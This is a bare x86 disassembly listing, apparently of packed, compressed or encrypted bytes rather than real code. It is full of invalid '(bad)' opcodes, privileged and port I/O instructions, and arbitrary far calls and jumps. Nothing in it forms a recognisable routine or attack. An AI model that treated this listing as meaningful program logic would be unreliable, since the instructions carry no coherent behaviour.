  41ff3a:	push   edi
  41ff3b:	sub    eax,0x432e564c
  41ff40:	(bad)  
  41ff41:	out    dx,al
  41ff42:	and    al,0xdf
  41ff44:	es xchg esp,eax
  41ff46:	and    BYTE PTR [ebx-0x63],dh
  41ff49:	nop
  41ff4a:	int3   
  41ff4b:	push   ds
  41ff4c:	add    esp,esi
  41ff4e:	sti    
  41ff4f:	inc    edi
  41ff50:	inc    edx
  41ff51:	inc    eax
  41ff52:	mov    edi,DWORD PTR [edi+ebx*1]
  41ff55:	sar    BYTE PTR [ebx],cl
  41ff57:	dec    ebp
  41ff58:	pop    es
  41ff59:	(bad)  
  41ff5a:	sbb    eax,0xebee9376
  41ff5f:	fdiv   QWORD PTR [ecx]
  41ff61:	lods   eax,DWORD PTR ds:[esi]
  41ff62:	inc    esi
  41ff63:	scas   eax,DWORD PTR es:[edi]
  41ff64:	jnp    0x41ff3b
  41ff66:	fcmovbe st,st(1)
  41ff68:	jg     0x41ff47
  41ff6a:	pop    eax
  41ff6b:	loop   0x41ffd4
  41ff6d:	xlat   BYTE PTR ds:[ebx]
  41ff6e:	ins    BYTE PTR es:[edi],dx
  41ff6f:	adc    ah,BYTE PTR [ecx]
  41ff71:	pop    ebx
  41ff72:	ins    DWORD PTR es:[edi],dx
  41ff73:	ret    
  41ff74:	pop    eax
  41ff75:	iret   
  41ff76:	outs   dx,DWORD PTR ds:[esi]
  41ff77:	pop    ss
  41ff78:	sub    al,0xa5
  41ff7a:	stos   DWORD PTR es:[edi],eax
  41ff7b:	and    ecx,DWORD PTR [eax-0x68e1b283]
  41ff81:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ff82:	(bad)  
  41ff83:	and    edx,DWORD PTR [edx-0xc]
  41ff86:	mov    edx,0x7e9876ec
  41ff8b:	cmp    ecx,DWORD PTR [eax+ebp*4+0x5f]
  41ff8f:	lds    esi,FWORD PTR [edi]
  41ff91:	fbstp  TBYTE PTR [eax]
  41ff93:	in     eax,0xa9
  41ff95:	push   edx
  41ff96:	jle    0x41fff4
  41ff98:	call   0x2fc8:0x2942f971
  41ff9f:	and    eax,0xb4b99411
  41ffa4:	test   al,0x9c
  41ffa6:	jns    0x41fffb
  41ffa8:	shl    DWORD PTR [eax+eax*4+0x7d],0x3b
  41ffad:	dec    ecx
  41ffae:	call   0x2a8f178e
  41ffb3:	lods   eax,DWORD PTR ds:[esi]
  41ffb4:	sub    esp,DWORD PTR [eax]
  41ffb6:	icebp  
  41ffb7:	mov    bl,0x9d
  41ffb9:	std    
  41ffba:	outs   dx,BYTE PTR ds:[esi]
  41ffbb:	sbb    BYTE PTR [esi+0x6f111b3],al
  41ffc1:	jbe    0x41ff5b
  41ffc3:	push   0xffffffb9
  41ffc5:	stc    
  41ffc6:	mov    ah,0xeb
  41ffc8:	push   edi
  41ffc9:	(bad)  
  41ffca:	cmc    
  41ffcb:	shl    BYTE PTR [ecx],cl
  41ffcd:	fadd   DWORD PTR ds:0xf0897b1f
  41ffd3:	lahf   
  41ffd4:	pop    ss
  41ffd5:	lock pop es
  41ffd7:	and    dl,BYTE PTR [edx-0x7c77cbd0]
  41ffdd:	inc    eax
  41ffde:	xchg   ebx,eax
  41ffdf:	pop    ds
  41ffe0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ffe1:	pop    eax
  41ffe2:	mov    edi,0x67baa8c3
  41ffe7:	mov    bh,0x8f
  41ffe9:	gs xchg ebx,eax
  41ffeb:	pop    ss
  41ffec:	jl     0x420015
  41ffee:	inc    ecx
  41ffef:	and    DWORD PTR [eax+ebp*1-0xd829fa8],0x5b
  41fff7:	sub    BYTE PTR [edi],ah
  41fff9:	mov    BYTE PTR [edx],dh
  41fffb:	shl    ebx,cl
  41fffd:	sub    ebx,esi
  41ffff:	xchg   ebp,eax
  420000:	adc    al,0x40
  420002:	mov    eax,ds:0xf5880916
  420007:	mov    dh,0xda
  420009:	aas    
  42000a:	sbb    dl,BYTE PTR [edx]
  42000c:	push   edx
  42000d:	into   
  42000e:	jmp    0xe5dd:0xc5704823
  420015:	leave  
  420016:	out    0xb0,al
  420018:	add    edi,DWORD PTR [ecx]
  42001a:	aad    0xd8
  42001c:	fiadd  DWORD PTR [esp+ebp*2-0x6b49aad5]
  420023:	sbb    esi,edi
  420025:	in     al,0xe1
  420027:	mov    ecx,0x235ed673
  42002c:	sub    BYTE PTR [ebp-0x2d],cl
  42002f:	sub    esp,DWORD PTR [edi]
  420031:	sub    BYTE PTR [edx-0x4547a049],al
  420037:	xor    cl,BYTE PTR [esi+eiz*1+0x49e743e7]
  42003e:	out    dx,al
  42003f:	mov    ebp,edi
  420041:	stos   BYTE PTR es:[edi],al
  420042:	adc    ebx,DWORD PTR [ecx+0x5c]
  420045:	sbb    cl,BYTE PTR [esi+ebx*4-0x50]
  420049:	mov    bh,0x9e
  42004b:	mov    al,0x9f
  42004d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42004e:	or     DWORD PTR [eax-0x72],0x74
  420052:	fld    QWORD PTR [eax]
  420054:	push   esi
  420055:	lock mov bh,BYTE PTR [eax]
  420058:	inc    ecx
  420059:	in     eax,dx
  42005a:	aam    0x20
  42005c:	sbb    DWORD PTR [ebx+0x1ad20df6],0x57244524
  420066:	adc    esp,DWORD PTR cs:[ebx]
  420069:	in     al,0xe9
  42006b:	and    al,BYTE PTR [ebx+edi*4-0x5d]
  42006f:	nop
  420070:	cmp    edi,DWORD PTR [eax]
  420072:	popa   
  420073:	clc    
  420074:	nop
  420075:	outs   dx,DWORD PTR ds:[esi]
  420076:	adc    ah,BYTE PTR [esi-0x3c3139af]
  42007c:	(bad)  
  42007d:	push   ds
  42007e:	frstor [ecx]
  420080:	sub    eax,0xc7d4d48c
  420085:	ror    DWORD PTR es:[ebx+0x3f],cl
  420089:	(bad)  
  42008a:	cmp    BYTE PTR [ecx-0x17],al
  42008d:	arpl   WORD PTR ds:0xa95e55fb,di
  420093:	dec    esi
  420094:	sbb    edx,esp
  420096:	jg     0x420104
  420098:	xchg   ebp,eax
  420099:	add    DWORD PTR [ecx+0x13],esp
  42009c:	dec    edx
  42009d:	inc    ebp
  42009e:	outs   dx,DWORD PTR ds:[esi]
  42009f:	mov    esi,0x150dc740
  4200a4:	inc    ecx
  4200a5:	shl    DWORD PTR [esi+0x1a0b0cbf],cl
  4200ab:	js     0x4200c0
  4200ad:	pop    DWORD PTR ds:0xa84f36f5
  4200b3:	mov    ch,0xbc
  4200b5:	xor    bl,BYTE PTR [edx]
  4200b7:	inc    ebp
  4200b8:	add    dh,BYTE PTR [esi-0x6deb09c1]
  4200be:	mov    edx,0x337b5288
  4200c3:	std    
  4200c4:	dec    ebp
  4200c5:	jno    0x42009e
  4200c7:	push   eax
  4200c8:	xor    DWORD PTR [edi],ebp
  4200ca:	daa    
  4200cb:	out    dx,al
  4200cc:	pop    ebx
  4200cd:	dec    edx
  4200ce:	stc    
  4200cf:	adc    dh,cl
  4200d1:	aad    0x69
  4200d3:	mov    cl,0xc
  4200d5:	pop    ss
  4200d6:	dec    esp
  4200d7:	cs ret 
  4200d9:	sbb    cl,BYTE PTR [esi]
  4200db:	test   esp,0x4bfeb573
  4200e1:	in     eax,dx
  4200e2:	shl    ecx,0x24
  4200e5:	inc    esp
  4200e6:	sub    eax,edi
  4200e8:	mov    bh,BYTE PTR [edi+0x40]
  4200eb:	(bad)  
  4200ed:	popf   
  4200ee:	mov    ecx,0xa2c07fa5
  4200f3:	inc    edx
  4200f4:	sar    DWORD PTR [edi],0x99
  4200f7:	and    DWORD PTR [esi-0xf46ff60],esi
  4200fd:	pop    edi
  4200fe:	sbb    dl,BYTE PTR [edx+0x22]
  420101:	dec    ebp
  420102:	cwde   
  420103:	cli    
  420104:	pop    esi
  420105:	mov    DWORD PTR [edx-0x3c682565],0x27c9ef16
  42010f:	mov    edx,0x2128dea8
  420114:	and    DWORD PTR [edi-0x1925970a],edx
  42011a:	dec    edx
  42011b:	or     DWORD PTR [eax+eiz*8-0x6d],esi
  42011f:	jg     0x4200e4
  420121:	mov    DWORD PTR [ebx+0x30],0xe7d83eb0
  420128:	jb     0x420146
  42012a:	icebp  
  42012b:	aas    
  42012c:	or     BYTE PTR [ebx],al
  42012e:	add    al,0xf5
  420130:	dec    esp
  420131:	dec    DWORD PTR [edx+0x40beb9af]
  420137:	sti    
  420138:	rol    WORD PTR [ebp-0x13],0x34
  42013d:	fmul   DWORD PTR [eax]
  42013f:	sbb    cl,dh
  420141:	rcl    DWORD PTR [ebx-0x6f],1
  420144:	cwde   
  420145:	mov    ch,0x39
  420147:	(bad)  
  420148:	push   edi
  420149:	in     eax,dx
  42014a:	ds pop es
  42014c:	xchg   bl,ah
  42014e:	pop    ss
  42014f:	nop
  420150:	or     al,0xa9
  420152:	scas   al,BYTE PTR es:[edi]
  420153:	push   ecx
  420154:	scas   eax,DWORD PTR es:[edi]
  420155:	in     al,0x77
  420157:	inc    ebp
  420158:	jb     0x4200f2
  42015a:	out    dx,al
  42015b:	out    dx,al
  42015c:	mov    esi,DWORD PTR [esi+0x3d]
  42015f:	adc    DWORD PTR [ebx+0x5a391fcb],edx
  420165:	call   0xb59b:0x10d93d5
  42016c:	push   ecx
  42016d:	outs   dx,BYTE PTR ds:[esi]
  42016e:	inc    eax
  42016f:	imul   ecx,DWORD PTR [ecx*4-0x41b0470d],0xffffffe7
  420177:	pop    es
  420178:	cs xchg ebx,eax
  42017a:	and    BYTE PTR [eax+0xf542b3a],ch
  420180:	cli    
  420181:	xor    cl,BYTE PTR [ecx]
  420183:	add    BYTE PTR fs:[eax],al
	...
  42018e:	add    BYTE PTR [eax],al
  420190:	add    BYTE PTR [edx+ecx*1-0x6060f363],dl
  420197:	xchg   ebp,eax
  420198:	call   0x2977:0x7836e732
  42019f:	mov    dh,0x5f
  4201a1:	ret    
  4201a2:	jnp    0x4201a5
  4201a4:	add    BYTE PTR [ebx+0x39000003],ch
  4201aa:	jbe    0x420176
  4201ac:	in     al,0x90
  4201ae:	mov    eax,ds:0xdf4262b0
  4201b3:	setge  cl
  4201b6:	retf   0xbad2
  4201b9:	sub    dh,BYTE PTR [eax+0x44]
  4201bc:	mov    ebx,0x224e9f34
  4201c1:	pop    edx
  4201c2:	xchg   BYTE PTR [eax-0x4f],dh
  4201c5:	or     DWORD PTR [ebx],edi
  4201c7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4201c8:	mov    ah,0x17
  4201ca:	cld    
  4201cb:	out    dx,eax
  4201cc:	cmp    DWORD PTR [esi],esp
  4201ce:	daa    
  4201cf:	fidivr DWORD PTR ds:0xf01d9b5
  4201d5:	push   0x1b
  4201d7:	xchg   esi,eax
  4201d8:	pop    es
  4201d9:	push   esi
  4201da:	enter  0x585b,0x4c
  4201de:	lahf   
  4201df:	js     0x420203
  4201e1:	iret   
  4201e2:	int3   
  4201e3:	jae    0x420191
  4201e5:	mov    ds:0x432a7d47,al
  4201ea:	(bad)  
  4201ed:	push   ebp
  4201ee:	ins    DWORD PTR es:[edi],dx
  4201ef:	lock add ch,BYTE PTR [edx+0x1bf93f45]
  4201f6:	ror    ecx,cl
  4201f8:	xchg   edi,eax
  4201f9:	mov    al,ds:0x435847ea
  4201fe:	stc    
  4201ff:	cmp    bl,BYTE PTR [ebx]
  420201:	cmp    edx,DWORD PTR [edx+esi*8+0x7]
  420205:	sub    eax,DWORD PTR [eax+edi*1-0x40c48add]
  42020c:	mov    dl,0x2d
  42020e:	scas   eax,DWORD PTR es:[edi]
  42020f:	xlat   BYTE PTR ds:[ebx]
  420210:	cld    
  420211:	popf   
  420212:	ret    
  420213:	(bad)  [eax-0x1d]
  420216:	mov    al,ds:0x8d58733f
  42021b:	mov    bl,0x83
  42021d:	in     eax,dx
  42021e:	jb     0x4201f0
  420220:	or     eax,0xf9236176
  420225:	or     ecx,0xffffffb0
  420228:	lea    esp,[esi]
  42022a:	sub    eax,0x8b349440
  42022f:	sbb    eax,DWORD PTR [ecx+0x2c]
  420232:	add    al,0xef
  420234:	push   ebx
  420235:	mov    eax,ds:0x655a0a49
  42023a:	push   ebx
  42023b:	cld    
  42023c:	scas   al,BYTE PTR es:[edi]
  42023d:	push   ebp
  42023e:	cmp    edx,edx
  420240:	cwde   
  420241:	ret    0xcdfb
  420244:	push   ecx
  420245:	dec    ebx
  420246:	adc    al,0xcc
  420248:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420249:	pop    esi
  42024a:	sbb    ah,BYTE PTR [edx]
  42024c:	lods   eax,DWORD PTR ds:[esi]
  42024d:	lds    eax,FWORD PTR [edi+0x34497e75]
  420253:	jle    0x42026f
  420255:	ins    BYTE PTR es:[edi],dx
  420256:	int3   
  420257:	jns    0x420236
  420259:	ret    0x1dae
  42025c:	pop    ecx
  42025d:	leave  
  42025e:	ins    BYTE PTR es:[edi],dx
  42025f:	jnp    0x4202bb
  420261:	xchg   esp,eax
  420262:	cwde   
  420263:	test   BYTE PTR [ebx-0x2048d9b9],ah
  420269:	js     0x420256
  42026b:	cld    
  42026c:	gs push edi
  42026e:	das    
  42026f:	ja     0x420218
  420271:	or     dh,BYTE PTR [ebx]
  420273:	daa    
  420274:	xchg   ecx,eax
  420275:	out    dx,eax
  420276:	push   edi
  420277:	inc    edx
  420278:	daa    
  420279:	adc    DWORD PTR [ebp-0x28],ecx
  42027c:	pop    edi
  42027d:	outs   dx,BYTE PTR ds:[esi]
  42027e:	and    DWORD PTR [edx+ecx*2-0xf],edx
  420282:	sub    bh,BYTE PTR [esi+0x73]
  420285:	mov    eax,ds:0x1cc54c14
  42028a:	mov    al,ds:0x67cfa257
  42028f:	sbb    al,bl
  420291:	loop   0x4202f3
  420293:	std    
  420294:	call   0x2b63:0x87f366fc
  42029b:	inc    eax
  42029c:	inc    edi
  42029d:	sti    
  42029e:	arpl   WORD PTR [esi+esi*1],sp
  4202a1:	cld    
  4202a2:	test   DWORD PTR [ebp-0x3c7cab9e],ebx
  4202a8:	cmp    eax,0xcd5e1889
  4202ad:	or     al,ah
  4202af:	inc    esi
  4202b0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4202b1:	sar    BYTE PTR [edx-0x4ce5bf2],0x79
  4202b8:	xor    eax,0x1c97765
  4202bd:	enter  0xef05,0x77
  4202c1:	test   DWORD PTR [esi-0x1a2c2c08],ebp
  4202c7:	jbe    0x42029c
  4202c9:	sti    
  4202ca:	inc    ebp
  4202cb:	mov    ah,0x18
  4202cd:	lahf   
  4202ce:	stos   DWORD PTR es:[edi],eax
  4202cf:	sub    al,0x4a
  4202d1:	jg     0x420279
  4202d3:	jg     0x4202f5
  4202d5:	(bad)  
  4202d7:	bnd ja 0x4202ff
  4202da:	std    
  4202db:	mov    edi,0x66b1823c
  4202e0:	jae    0x420302
  4202e2:	test   al,0xbe
  4202e4:	sahf   
  4202e5:	cmp    esp,DWORD PTR [ebx]
  4202e7:	lahf   
  4202e8:	icebp  
  4202e9:	inc    ecx
  4202ea:	mov    dl,0x2c
  4202ec:	lock pusha 
  4202ee:	in     eax,dx
  4202ef:	adc    BYTE PTR [edx+0x6f],bh
  4202f2:	pop    ss
  4202f3:	mov    ds:0x9d581ed2,al
  4202f8:	clc    
  4202f9:	clc    
  4202fa:	or     ecx,edx
  4202fc:	pushf  
  4202fd:	cmp    BYTE PTR [eax+eax*1],cl
  420300:	xlat   BYTE PTR ds:[ebx]
  420301:	add    esp,ecx
  420303:	and    DWORD PTR [ebx],ecx
  420305:	pop    ss
  420306:	dec    edi
  420307:	fiadd  DWORD PTR [ecx+0x37887e30]
  42030d:	mov    edx,0xdec18482
  420312:	outs   dx,DWORD PTR ds:[esi]
  420313:	jmp    0x7b837037
  420318:	mov    esp,0xbc83106c
  42031d:	jb     0x420395
  42031f:	gs dec ebx
  420321:	mov    ecx,0xa7c619ed
  420326:	inc    ebx
  420327:	leave  
  420328:	fs sar esp,1
  42032b:	mov    cl,0x82
  42032d:	and    al,BYTE PTR [eax]
  42032f:	sub    edi,DWORD PTR [esi-0x383b07b8]
  420335:	sti    
  420336:	(bad)  
  420337:	popf   
  420338:	(bad)  
  420339:	es icebp 
  42033b:	xor    ah,BYTE PTR [edx]
  42033d:	or     al,0x51
  42033f:	jnp    0x420348
  420341:	fnstcw WORD PTR es:0xfd162d20
  420348:	out    0xda,al
  42034a:	sbb    edx,DWORD PTR [edi]
  42034c:	cmc    
  42034d:	push   edx
  42034e:	das    
  42034f:	xor    eax,0xf72d18d9
  420354:	jnp    0x4203ab
  420356:	mov    eax,ds:0xd740ba20
  42035b:	mov    BYTE PTR [eax],al
  42035d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42035e:	mov    eax,ds:0xe2c5d823
  420363:	gs (bad) 
  420366:	(bad)  
  420367:	fsub   QWORD PTR [edx-0xf]
  42036a:	(bad)  
  42036b:	fmul   st,st(5)
  42036d:	sbb    eax,0xbf75a1f4
  420372:	mov    esi,0x272ed737
  420377:	adc    DWORD PTR [eax-0x57],edx
  42037a:	pop    eax
  42037b:	adc    eax,0x6422945
  420380:	sbb    DWORD PTR [ecx-0x75b5144a],ebx
  420386:	scas   eax,DWORD PTR es:[edi]
  420387:	pop    eax
  420388:	dec    ecx
  420389:	movs   DWORD PTR es:[edi],DWORD PTR fs:[esi]
  42038b:	shr    DWORD PTR [edi-0x6],1
  42038e:	adc    eax,0x3f006847
  420393:	xor    al,0x70
  420395:	rol    BYTE PTR [ecx-0x44a698c6],cl
  42039b:	test   BYTE PTR [edx],dl
  42039d:	retf   
  42039e:	sbb    ebp,DWORD PTR [eax]
  4203a0:	pop    edx
  4203a1:	mov    bl,0xb9
  4203a3:	push   ebp
  4203a4:	fsubr  QWORD PTR [ecx]
  4203a6:	cmp    al,0x10
  4203a8:	jns    0x42034a
  4203aa:	cmp    edi,ebx
  4203ac:	jmp    0x9659d459
  4203b1:	icebp  
  4203b2:	(bad)  
  4203b3:	jmp    0xf563967f
  4203b8:	shl    BYTE PTR [edi+0x39],1
  4203bb:	and    esp,DWORD PTR [edi-0x2e]
  4203be:	ins    BYTE PTR es:[edi],dx
  4203bf:	cmp    dl,BYTE PTR [ecx+ecx*2-0x2d]
  4203c3:	aaa    
  4203c4:	sti    
  4203c5:	aam    0x24
  4203c7:	call   0x64fa6002
  4203cc:	sub    bl,BYTE PTR [ecx+ebx*2-0x3d]
  4203d0:	add    BYTE PTR ds:0xc2f9369b,ch
  4203d6:	repnz jmp 0x1738:0x8200a680
  4203de:	mov    ss,WORD PTR [esi+0x42]
  4203e1:	out    dx,al
  4203e2:	int3   
  4203e3:	aad    0xbc
  4203e5:	es xor cl,dl
  4203e8:	push   esi
  4203e9:	aaa    
  4203ea:	mov    ecx,0x5cc30fab
  4203ef:	push   ds
  4203f0:	jne    0x42037d
  4203f2:	mov    dl,0x8b
  4203f4:	mov    cl,0x69
  4203f7:	fwait
  4203f8:	dec    esp
  4203f9:	mov    ch,0x3f
  4203fb:	imul   esp,DWORD PTR [ecx-0x1a6f6e8f],0x22cb951
  420405:	cmc    
  420406:	xchg   edx,eax
  420407:	sbb    al,0xcd
  420409:	jmp    0xd3c66f13
  42040e:	paddq  mm6,QWORD PTR [esi+esi*8]
  420412:	inc    edi
  420413:	icebp  
  420414:	mov    edx,0x32558151
  420419:	addr16 pop edx
  42041b:	xor    BYTE PTR [eax-0x2f],dh
  42041e:	xor    eax,0x94ad86e
  420423:	inc    ebx
  420425:	push   cs
  420426:	inc    eax
  420427:	xor    ebp,DWORD PTR [ebx+0xdc3ffc4]
  42042d:	lods   al,BYTE PTR ds:[esi]
  42042e:	push   es
  42042f:	mov    eax,ds:0x703070b7
  420434:	mov    bh,0x83
  420436:	mov    ds:0x3bd77d46,al
  42043b:	stos   DWORD PTR es:[edi],eax
  42043c:	ret    0x4538
  42043f:	ret    
  420440:	pop    ecx
  420441:	lahf   
  420442:	ret    0x5e0d
  420445:	data16 clc 
  420447:	(bad)  
  420449:	dec    ebp
  42044a:	jb     0x4203ce
  42044c:	pop    edx
  42044d:	(bad)  
  42044e:	push   ebx
  42044f:	jge    0x42044d
  420451:	mov    ah,0x7a
  420453:	and    al,0xf6
  420455:	dec    cl
  420457:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420458:	pop    ds
  420459:	push   0x4c
  42045b:	xchg   ecx,eax
  42045c:	outs   dx,DWORD PTR ds:[esi]
  42045d:	inc    eax
  42045e:	sub    eax,0x32fe0ff5
  420463:	pop    ecx
  420464:	call   0xdc1b:0x1ae8eca7
  42046b:	fiadd  WORD PTR [ecx-0x61]
  42046e:	aas    
  42046f:	popa   
  420470:	shl    DWORD PTR [ebp+ebp*8-0x19a79469],0xcc
  420478:	(bad)  
  420479:	xlat   BYTE PTR ds:[ebx]
  42047a:	in     al,dx
  42047b:	mov    esi,0xf4781839
  420480:	xchg   esi,eax
  420481:	mov    WORD PTR [ecx],fs
  420483:	xchg   esp,eax
  420484:	pop    esi
  420485:	mov    ecx,0x672e7d6
  42048a:	fiadd  DWORD PTR [edi-0xca163e7]
  420490:	out    0xff,eax
  420492:	fs stos BYTE PTR es:[edi],al
  420494:	and    DWORD PTR [ebp+0x1c7aa094],eax
  42049a:	push   edi
  42049b:	test   DWORD PTR [esi-0x73],ebp
  42049e:	xchg   BYTE PTR [ebx],dh
  4204a0:	(bad)  
  4204a2:	ds pop ds
  4204a4:	repz and eax,0x4a752e58
  4204aa:	leave  
  4204ab:	xor    al,0x7b
  4204ad:	loopne 0x420494
  4204af:	pop    ebx
  4204b0:	jno    0x4204ec
  4204b2:	sbb    ebx,DWORD PTR [ebx-0x6f]
  4204b5:	adc    eax,esp
  4204b7:	in     eax,0x1a
  4204b9:	adc    ecx,DWORD PTR [edi-0x78]
  4204bc:	aas    
  4204bd:	adc    edi,ecx
  4204bf:	bound  ebx,QWORD PTR [ebx-0x1123a107]
  4204c5:	jns    0x42048f
  4204c7:	cmp    BYTE PTR [edi],bl
  4204c9:	sbb    DWORD PTR [esi-0xa],esp
  4204cc:	mov    ebp,0x2972755a
  4204d1:	pushf  
  4204d2:	(bad)  
  4204d3:	out    0xeb,al
  4204d5:	xchg   esp,eax
  4204d6:	xchg   ebx,eax
  4204d7:	lea    ecx,[ebx]
  4204d9:	cdq    
  4204da:	cmp    eax,0xe43662e
  4204df:	pop    ss
  4204e0:	mov    esi,0x4220a95e
  4204e5:	stos   DWORD PTR es:[edi],eax
  4204e6:	mov    dh,0x8f
  4204e8:	pop    DWORD PTR [eax]
  4204ea:	sti    
  4204eb:	sbb    ah,BYTE PTR [edx-0x4d]
  4204ee:	in     al,dx
  4204ef:	or     DWORD PTR [esp+ecx*2],esp
  4204f2:	xchg   ebx,eax
  4204f3:	pop    edi
  4204f4:	dec    ecx
  4204f5:	add    ecx,DWORD PTR [ecx]
  4204f7:	out    dx,eax
  4204f8:	cmp    dh,BYTE PTR [ebx-0x6e9b3c44]
  4204fe:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4204ff:	xchg   BYTE PTR [esi+0x32377521],ah
  420505:	push   es
  420506:	mov    ds:0x5a781d75,eax
  42050b:	xor    eax,0xdeb722f1
  420510:	cmp    eax,0xb006b78b
  420515:	xchg   esi,eax
  420516:	push   ebp
  420517:	inc    edx
  420518:	lahf   
  420519:	retf   0x749f
  42051c:	scas   al,BYTE PTR es:[edi]
  42051d:	retw   
  42051f:	loop   0x42050c
  420521:	jmp    0x83c608ae
  420526:	(bad)  
  420527:	bound  ecx,QWORD PTR [esi]
  420529:	aam    0xf2
  42052b:	into   
  42052c:	test   DWORD PTR [ebp+eax*1+0x68ee3d83],ebp
  420533:	push   es
  420534:	out    dx,eax
  420535:	mov    ecx,0xee819120
  42053a:	dec    edi
  42053b:	dec    ebx
  42053c:	(bad)  
  42053d:	mov    edx,0xbd1ac87b
  420542:	nop
  420543:	outs   dx,DWORD PTR ds:[esi]
  420544:	jo     0x420555
  420546:	repz push ss
  420548:	jle    0x4205b1
  42054a:	pop    edi
  42054b:	mov    edi,0xbf808cda
  420550:	jne    0x420578
  420552:	inc    edx
  420553:	popa   
	...
  420560:	add    BYTE PTR [eax-0x5020734d],dl
  420566:	call   ebx
  420568:	jmp    esp
  42056a:	and    dh,0xd4
  42056d:	pusha  
  42056e:	aas    
  42056f:	pop    ds
  420570:	(bad)  
  420571:	outs   dx,BYTE PTR ds:[esi]
  420572:	jg     0x420575
  420574:	add    BYTE PTR [ebx+0x26000003],ch
  42057a:	stc    
  42057b:	out    0x59,al
  42057d:	mov    eax,ds:0xeb2c8840
  420582:	fistp  WORD PTR [edi+0x1c4992fd]
  420588:	xchg   ebp,eax
  420589:	mov    ch,0x50
  42058b:	xor    dh,dl
  42058d:	pop    edi
  42058e:	xchg   esi,eax
  42058f:	in     al,0x94
  420591:	(bad)  
  420592:	popa   
  420593:	dec    esp
  420594:	xchg   esp,ebp
  420596:	push   ds
  420597:	ficomp DWORD PTR [edi+esi*8]
  42059a:	ss ret 0x26a7
  42059e:	loopne 0x42054f
  4205a0:	push   ss
  4205a1:	or     eax,esi
  4205a3:	in     al,0x77
  4205a5:	fcom   QWORD PTR [ecx]
  4205a7:	enter  0x2470,0xb2
  4205ab:	fistp  WORD PTR ds:0xd626bb63
  4205b1:	or     al,0x34
  4205b3:	xor    BYTE PTR [edx],bl
  4205b5:	jge    0x420568
  4205b7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4205b8:	ins    BYTE PTR es:[edi],dx
  4205b9:	or     DWORD PTR ds:0x9fef7dd2,edi
  4205bf:	js     0x4205fc
  4205c1:	xor    bh,BYTE PTR [ecx-0x114d9a04]
  4205c7:	add    al,0x9f
  4205c9:	js     0x4205ad
  4205cb:	popa   
  4205cc:	and    DWORD PTR [edx-0x19],0x40aaa0f7
  4205d3:	push   ecx
  4205d4:	into   
  4205d5:	scas   eax,DWORD PTR es:[edi]
  4205d6:	push   ss
  4205d7:	inc    esp
  4205d8:	mov    dl,0x8c
  4205da:	jecxz  0x420572
  4205dc:	hlt    
  4205dd:	add    al,0x8
  4205df:	rol    BYTE PTR [edx+0x57b51dff],cl
  4205e5:	add    ch,BYTE PTR [ecx-0x7df391cc]
  4205eb:	push   esi
  4205ec:	jg     0x42058b
  4205ee:	or     al,0x4c
  4205f0:	in     al,0x6b
  4205f2:	fwait
  4205f3:	push   ebx
  4205f4:	dec    esp
  4205f5:	dec    edi
  4205f6:	subps  xmm6,XMMWORD PTR [edi]
  4205f9:	mov    bh,0xb4
  4205fb:	das    
  4205fc:	jl     0x420591
  4205fe:	mov    esp,DWORD PTR [esi+0x5b]
  420601:	cmp    eax,0xd252a9ff
  420606:	xor    eax,0x89e44b3b
  42060b:	mov    ah,0x9c
  42060d:	rol    BYTE PTR [ebp-0x32],1
  420610:	retf   
  420611:	pop    ds
  420612:	xor    dl,BYTE PTR [edi+0x64]
  420615:	push   ebp
  420616:	mov    al,ds:0x2142bf81
  42061b:	out    0xc4,al
  42061d:	sub    bl,BYTE PTR [ebx+0x54]
  420620:	mov    ebp,0x1998171
  420625:	or     DWORD PTR [ecx-0x7b68f2e7],ebx
  42062b:	dec    ebp
  42062c:	xchg   BYTE PTR [eax+eax*4-0x74],dl
  420630:	dec    ebx
  420631:	sub    ah,dl
  420633:	xchg   ecx,eax
  420634:	push   ebp
  420635:	(bad)  
  420636:	es ins DWORD PTR es:[edi],dx
  420638:	push   0x3c3e372e
  42063d:	std    
  42063e:	or     al,dl
  420640:	lods   al,BYTE PTR ds:[esi]
  420641:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420642:	jne    0x420675
  420644:	mov    BYTE PTR [esi-0x4789f294],dl
  42064a:	sub    DWORD PTR [edi],ebp
  42064c:	add    BYTE PTR [esi+0x16],bl
  42064f:	pop    es
  420650:	(bad)  
  420651:	cmp    eax,0x3e1cf47c
  420656:	adc    eax,DWORD PTR [edi]
  420658:	pop    esp
  420659:	and    BYTE PTR [eax+0x23a6d154],bl
  42065f:	adc    al,BYTE PTR [ebx]
  420661:	add    esp,DWORD PTR [eax+0x2b]
  420664:	jecxz  0x420643
  420666:	mov    ?,edi
  420668:	mov    ch,0x80
  42066a:	int3   
  42066b:	sti    
  42066c:	aam    0xdf
  42066e:	hlt    
  42066f:	adc    DWORD PTR [ebx+0x20],0x8
  420673:	and    DWORD PTR [esp+eiz*4+0x6c],ebx
  420677:	mov    esp,0x1d29b7a1
  42067c:	sub    al,0xc5
  42067e:	popf   
  42067f:	xor    BYTE PTR [edx],al
  420681:	in     al,dx
  420682:	mov    eax,?
  420684:	adc    eax,0xf5e60e60
  420689:	lahf   
  42068a:	sbb    bl,BYTE PTR [eax]
  42068c:	cli    
  42068d:	jge    0x42065a
  42068f:	les    esp,FWORD PTR ds:0xb0a1c711
  420695:	push   cs
  420696:	push   ecx
  420697:	mov    ebx,0x8730b51e
  42069c:	or     eax,0x1df9a6a2
  4206a1:	jo     0x420631
  4206a3:	ficom  DWORD PTR [edx-0x2a]
  4206a6:	out    0x9d,eax
  4206a8:	xchg   esi,eax
  4206a9:	add    bh,BYTE PTR [edi-0x76]
  4206ac:	jae    0x42066f
  4206ae:	adc    eax,0x467e50eb
  4206b3:	cmp    eax,0xf6077fc3
  4206b8:	adc    cl,ah
  4206ba:	(bad)  
  4206bb:	scas   eax,DWORD PTR es:[edi]
  4206bc:	fdivr  st(6),st
  4206be:	dec    ebp
  4206bf:	mov    edx,0x752f41f3
  4206c4:	xor    al,BYTE PTR [edi-0x65]
  4206c7:	shl    DWORD PTR [ecx-0x750edd86],1
  4206cd:	cwde   
  4206ce:	cmp    bl,0x22
  4206d1:	adc    al,0x20
